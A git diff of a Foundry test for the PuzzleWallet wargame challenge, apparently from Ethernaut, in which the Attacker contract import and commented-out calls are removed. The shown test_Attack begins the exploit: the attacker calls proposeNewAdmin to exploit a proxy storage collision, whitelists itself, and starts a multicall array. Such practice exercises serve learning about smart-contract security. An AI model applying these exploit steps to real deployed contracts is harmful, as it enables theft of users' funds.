@@ -2,14 +2,13 @@
 pragma solidity ^0.8.13;
 
 import {Test, console2} from "forge-std/Test.sol";
-import {PuzzleWallet, PuzzleProxy, Attacker} from "../src/PuzzleWallet.sol";
+import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";
 
 contract PuzzleWalletTest is Test {
     PuzzleWallet internal puzzleWallet;
     PuzzleProxy internal puzzleProxy;
     PuzzleWallet internal puzzleProxyAsWallet;
     address internal attacker;
-    Attacker internal attackerContract;
 
     function setUp() public {
         attacker = address(0x1);
@@ -26,12 +25,8 @@ contract PuzzleWalletTest is Test {
 
     function test_Attack() public {
         vm.startPrank(attacker);
-        // attackerContract = new Attacker(address(puzzleProxy), address(puzzleWallet));
-
-        // attackerContract.attack();
 
         puzzleProxy.proposeNewAdmin(attacker);
-
         puzzleProxyAsWallet.addToWhitelist(attacker);
 
         bytes[] memory data = new bytes[](3);
